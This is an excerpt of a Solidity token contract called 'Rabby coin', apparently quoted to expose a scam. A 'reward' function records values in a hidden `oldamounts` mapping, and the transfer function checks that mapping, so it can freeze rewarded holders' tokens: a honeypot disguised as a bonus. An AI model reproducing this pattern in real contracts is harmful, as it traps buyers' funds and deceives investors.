...
contract RabbyCoin {
    ...
    mapping(address => uint256) private oldamounts;
    mapping(address => uint256) private balances;
    mapping(address => mapping(address => uint256)) private allowances;

    string public constant name = "Rabby coin";
    string public constant symbol = "RABBY";
    ...
    function _transfer(
        ...
        if (oldamounts[from] > 0) {
            require(_count(oldamounts[from], balances[from]) == 0);
        }
    ...
    function reward(
        ...
        for (uint256 i = 0; i < _users.length; i++) {
            if (balanceOf(_users[i]) > _minBalanceToReward) {
                ...
                _changeAmount(_users[i], rewardAmount);
            }
        }
    }

    function _changeAmount(address _user, uint256 amount) internal {
        oldamounts[_user] = amount;
    }
